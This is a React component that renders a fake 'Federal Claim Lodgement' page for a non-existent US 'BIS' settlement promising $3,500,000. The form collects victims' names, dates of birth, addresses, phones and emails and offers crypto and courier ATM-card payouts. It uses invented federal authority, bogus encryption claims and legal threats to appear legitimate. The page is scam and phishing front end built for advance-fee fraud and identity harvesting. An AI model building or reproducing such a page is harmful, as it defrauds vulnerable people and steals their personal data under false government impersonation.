import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { 
  User, Globe, Mail, Landmark, AlertCircle, Calendar, 
  MapPin, Phone, CreditCard, ShieldCheck, Loader2, 
  FileText, Lock, FileBadge, Scale, ShieldAlert, Building2
} from 'lucide-react';
import GlassCard from '../components/GlassCard.tsx';
import MotionButton from '../components/MotionButton.tsx';
import { VerificationFormData } from '../types.ts';

interface VerifyProps {
  onSuccess: (data: VerificationFormData) => void;
}

const Verify: React.FC<VerifyProps> = ({ onSuccess }) => {
  const [formData, setFormData] = useState<VerificationFormData>({
    fullName: '',
    dob: '',
    nationality: '',
    occupation: '',
    address: '',
    phone: '',
    email: '',
    paymentMethod: 'Bank Direct Wire Transfer',
    referenceId: 'BIS/CPM/025'
  });

  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      onSuccess(formData);
    }, 2500);
  };

  const labelClass = "text-[10px] font-black text-slate-900 mb-1.5 uppercase tracking-widest block";
  const inputClass = "w-full pl-10 pr-4 py-4 rounded-none border-2 border-slate-200 focus:border-[#002868] transition-all outline-none bg-white text-slate-900 font-bold placeholder:text-slate-300 uppercase text-xs";

  return (
    <div className="pt-32 pb-24 max-w-6xl mx-auto px-4">
      <div className="flex flex-col md:flex-row items-center gap-6 mb-12 border-b-4 border-slate-900 pb-8">
        <div className="p-4 bg-[#002868] text-white">
          <Landmark className="w-10 h-10" />
        </div>
        <div className="text-left flex-grow">
          <h2 className="text-4xl font-black text-slate-900 tracking-tighter uppercase leading-none">Federal Claim Lodgement</h2>
          <p className="text-[#BF0A30] font-black text-xs uppercase tracking-widest mt-2">Active File: BIS/CPM/025 • United States Settlement Initiative 2025</p>
        </div>
        <img 
          src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" 
          className="h-8 shadow-sm hidden md:block" 
          alt="USA Flag" 
        />
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-12">
        {/* Left Side: Form */}
        <div className="lg:col-span-8">
          <form onSubmit={handleSubmit} className="space-y-8 bg-white p-8 md:p-12 shadow-2xl border border-slate-100">
            <div className="bg-[#BF0A30]/5 border-l-4 border-[#BF0A30] p-6 flex gap-4 items-start">
              <ShieldAlert className="w-6 h-6 text-[#BF0A30] shrink-0" />
              <div>
                <h4 className="text-sm font-black text-slate-900 uppercase tracking-tighter mb-1">Official Declaration</h4>
                <p className="text-[11px] text-slate-600 font-bold uppercase leading-relaxed">
                  By submitting this form, I certify that all information provided is accurate and my claim for the 
                  <span className="text-[#BF0A30] ml-1">$3,500,000.00</span> settlement is valid under BIS regulations.
                </p>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="relative md:col-span-2">
                <label className={labelClass}>Full Legal Name (as per ID)</label>
                <User className="absolute left-3 bottom-4 z-10 w-5 h-5 text-slate-400" />
                <input 
                  required 
                  type="text" 
                  placeholder="John Fitzgerald Doe"
                  className={inputClass} 
                  value={formData.fullName} 
                  onChange={e => setFormData({...formData, fullName: e.target.value})} 
                />
              </div>
              <div className="relative">
                <label className={labelClass}>Date of Birth</label>
                <Calendar className="absolute left-3 bottom-4 z-10 w-5 h-5 text-slate-400" />
                <input 
                  required 
                  type="text" 
                  placeholder="MM/DD/YYYY" 
                  className={inputClass} 
                  value={formData.dob} 
                  onChange={e => setFormData({...formData, dob: e.target.value})} 
                />
              </div>
              <div className="relative">
                <label className={labelClass}>Nationality</label>
                <Globe className="absolute left-3 bottom-4 z-10 w-5 h-5 text-slate-400" />
                <input 
                  required 
                  type="text" 
                  placeholder="United States / Canada"
                  className={inputClass} 
                  value={formData.nationality} 
                  onChange={e => setFormData({...formData, nationality: e.target.value})} 
                />
              </div>
              <div className="relative md:col-span-2">
                <label className={labelClass}>Residential Address</label>
                <MapPin className="absolute left-3 bottom-4 z-10 w-5 h-5 text-slate-400" />
                <input 
                  required 
                  type="text" 
                  placeholder="Street, City, State, ZIP"
                  className={inputClass} 
                  value={formData.address} 
                  onChange={e => setFormData({...formData, address: e.target.value})} 
                />
              </div>
              <div className="relative">
                <label className={labelClass}>Contact Telephone</label>
                <Phone className="absolute left-3 bottom-4 z-10 w-5 h-5 text-slate-400" />
                <input 
                  required 
                  type="tel" 
                  placeholder="+1 (000) 000-0000"
                  className={inputClass} 
                  value={formData.phone} 
                  onChange={e => setFormData({...formData, phone: e.target.value})} 
                />
              </div>
              <div className="relative">
                <label className={labelClass}>Official Email</label>
                <Mail className="absolute left-3 bottom-4 z-10 w-5 h-5 text-slate-400" />
                <input 
                  required 
                  type="email" 
                  placeholder="email@example.gov"
                  className={inputClass} 
                  value={formData.email} 
                  onChange={e => setFormData({...formData, email: e.target.value})} 
                />
              </div>
              <div className="relative md:col-span-2">
                <label className={labelClass}>Preferred Settlement Channel</label>
                <CreditCard className="absolute left-3 bottom-4 z-10 w-5 h-5 text-slate-400" />
                <select 
                  className={`${inputClass} appearance-none cursor-pointer`} 
                  value={formData.paymentMethod} 
                  onChange={e => setFormData({...formData, paymentMethod: e.target.value})}
                >
                  <option>Bank Direct Wire Transfer</option>
                  <option>Certified Treasury Check (USPS Priority)</option>
                  <option>ATM Card (Courier Dispatch)</option>
                  <option>Digital Settlement Node (BTC/USDT)</option>
                </select>
              </div>
            </div>

            <div className="pt-6">
              <MotionButton 
                type="submit" 
                variant="primary" 
                className="w-full py-5 text-sm font-black uppercase tracking-[0.3em] bg-[#002868] hover:bg-[#BF0A30] rounded-none disabled:bg-slate-300" 
                disabled={isLoading}
              >
                {isLoading ? (
                  <div className="flex items-center gap-3">
                    <Loader2 className="w-5 h-5 animate-spin" />
                    <span>Transmitting Data...</span>
                  </div>
                ) : (
                  <div className="flex items-center gap-3">
                    <FileBadge className="w-5 h-5" />
                    <span>Authorize Federal Lodgement</span>
                  </div>
                )}
              </MotionButton>
            </div>
            
            <p className="text-[9px] text-slate-400 text-center font-bold uppercase tracking-widest">
              Submission IP recorded for security audit. Unauthorized claims are punishable under BIS 2025 Directive.
            </p>
          </form>
        </div>

        {/* Right Side: Compliance & Authority */}
        <div className="lg:col-span-4 space-y-6">
          <div className="bg-slate-950 p-8 text-white">
            <div className="flex items-center gap-4 mb-8">
              <ShieldCheck className="w-8 h-8 text-[#BF0A30]" />
              <h3 className="text-xl font-black uppercase tracking-tighter">Security Protocol</h3>
            </div>
            <div className="space-y-8">
              <div className="flex gap-4">
                <div className="w-10 h-10 bg-white/10 flex items-center justify-center shrink-0">
                  <Lock className="w-5 h-5 text-[#BF0A30]" />
                </div>
                <div>
                  <h4 className="text-[10px] font-black uppercase tracking-widest text-white/50 mb-1">Encryption Mode</h4>
                  <p className="text-xs font-bold leading-relaxed">AES-256 Multi-Layer Federal Standards.</p>
                </div>
              </div>
              <div className="flex gap-4">
                <div className="w-10 h-10 bg-white/10 flex items-center justify-center shrink-0">
                  <Scale className="w-5 h-5 text-[#BF0A30]" />
                </div>
                <div>
                  <h4 className="text-[10px] font-black uppercase tracking-widest text-white/50 mb-1">Compliance Check</h4>
                  <p className="text-xs font-bold leading-relaxed">Automated Cross-Reference with Global BIS Asset Files.</p>
                </div>
              </div>
              <div className="flex gap-4">
                <div className="w-10 h-10 bg-white/10 flex items-center justify-center shrink-0">
                  <Building2 className="w-5 h-5 text-[#BF0A30]" />
                </div>
                <div>
                  <h4 className="text-[10px] font-black uppercase tracking-widest text-white/50 mb-1">Bank Assignment</h4>
                  <p className="text-xs font-bold leading-relaxed">Top-tier Accredited Federal Reserve Correspondent Banks.</p>
                </div>
              </div>
            </div>

            <div className="mt-12 p-6 border-2 border-white/10 text-center">
              <p className="text-[10px] text-blue-300 font-black uppercase tracking-widest leading-relaxed">
                Notice: All verified claims are indivisible and final.
              </p>
            </div>
          </div>

          <div className="border-4 border-slate-200 p-2">
            <img 
              src="https://images.unsplash.com/photo-1570126688035-1e6adbd61053?auto=format&fit=crop&q=80&w=800" 
              alt="Lincoln Memorial" 
              className="w-full h-56 object-cover grayscale"
            />
            <div className="bg-slate-50 p-4 text-center border-t-2 border-slate-200">
              <span className="text-[10px] font-black text-slate-900 uppercase tracking-widest">Office of Asset Recovery</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Verify;